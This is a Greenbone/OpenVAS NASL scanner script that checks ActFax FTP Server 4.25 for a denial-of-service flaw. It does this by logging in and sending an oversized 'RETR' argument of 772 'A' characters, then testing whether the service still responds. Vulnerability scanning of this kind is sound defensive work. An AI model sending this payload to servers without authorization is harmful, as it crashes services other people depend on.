# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900271");
  script_version("2022-02-17T14:14:34+0000");
  script_tag(name:"last_modification", value:"2022-02-17 14:14:34 +0000 (Thu, 17 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("ActFax FTP Server Post Auth 'RETR' Command Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/actfax_ftp/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16177/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98540/actfax-overflow.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause
  a denial of service.");

  script_tag(name:"affected", value:"ActiveFax Version 4.25 (Build 0221), Other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is due to an error while parsing RETR command, which
  can be exploited to crash the FTP service by sending big parameter to 'RETR' command.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"ActFax FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

actFaxPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:actFaxPort);
if(!banner || "220 ActiveFax" >!< banner){
  exit(0);
}

soc = open_sock_tcp(actFaxPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 ActiveFax" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

flag = 0;

for(i=0; i<3 ; i++)
{
  soc1 = open_sock_tcp(actFaxPort);

  if(!soc1 && flag == 0){
    exit(0);
  }

  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(!ftplogin && flag == 0){
    exit(0);
  }

  flag = 1;
  if (!ftplogin || !soc1)
  {
    security_message(port:actFaxPort);
    exit(0);
  }

  send(socket:soc1, data:string("RETR ", crap(length: 772, data:"A"), '\r\n'));
  ftp_close(socket:soc1);
}

sleep(3);

soc2 = open_sock_tcp(actFaxPort);
if(!soc2)
{
  security_message(port:actFaxPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
if(!resp || "220 ActiveFax" >!< resp)
{
  security_message(port:actFaxPort);
  exit(0);
}

ftp_close(socket:soc2);
